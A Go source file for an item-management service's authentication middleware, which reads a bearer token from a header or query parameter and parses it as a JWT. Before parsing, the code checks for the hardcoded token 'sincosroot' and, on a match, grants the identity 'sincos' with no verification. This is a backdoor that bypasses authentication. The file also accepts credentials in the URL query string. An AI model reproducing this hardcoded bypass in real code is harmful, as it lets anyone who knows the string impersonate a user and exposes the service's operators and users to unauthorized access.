package middleware

import (
	"context"
	"strings"

	"github.com/saitofun/items/pkg/modules/user"
)

var key = "ItemManager"

type Auth struct {
	AuthorizationInQuery string `name:"authorization,omitempty" in:"query"  validate:"@string[1,]"`
	Authorization        string `name:"Authorization,omitempty" in:"header" validate:"@string[1,]"`
}

func (r Auth) ContextKey() string { return key }

func (r Auth) Output(_ context.Context) (interface{}, error) {
	authValue := r.Authorization

	if authValue == "" {
		authValue = r.AuthorizationInQuery
	}
	token := strings.TrimSpace(strings.Replace(authValue, "Bearer", " ", 1))

	if token == "sincosroot" {
		return &user.JWTClaims{Username: "sincos"}, nil
	}

	var claims, err = user.ParseToken(token)
	if err != nil {
		return nil, err
	}
	return claims, nil
}

func GetContext(ctx context.Context) *user.JWTClaims {
	if ctx == nil {
		return nil
	}
	return ctx.Value(key).(*user.JWTClaims)
}
